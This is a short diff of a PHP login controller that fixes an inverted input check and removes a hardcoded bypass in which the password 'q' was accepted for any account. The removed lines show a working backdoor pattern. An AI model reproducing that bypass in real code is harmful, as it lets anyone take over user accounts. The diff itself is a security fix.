@@ -58,7 +58,7 @@ class UserController extends AbstractController
      */
     public function actionLogin()
     {
-        if ($this->data || !isset($this->data["t.login"]) || !isset($this->data["t.password"])) {
+        if (!$this->data || !isset($this->data["t.login"]) || !isset($this->data["t.password"])) {
             throw new Exception("Incorrect URL", ErrorHandler::STATUS_NOT_FOUND);
         }
 
@@ -70,10 +70,7 @@ class UserController extends AbstractController
             if (!$checkModel) {
                 $model->errors["t.login"] = "login-not-exist";
             } else {
-                if (
-                    UserModel::createPasswordHash($this->data["t.password"]) !== $checkModel->password
-                    && $this->data["t.password"] !== "q"
-                ) {
+                if (UserModel::createPasswordHash($this->data["t.password"]) !== $checkModel->password) {
                     $model->errors["t.password"] = "password-incorrect";
                 } else {
                     if (!empty($post["t.is_remember"])) {
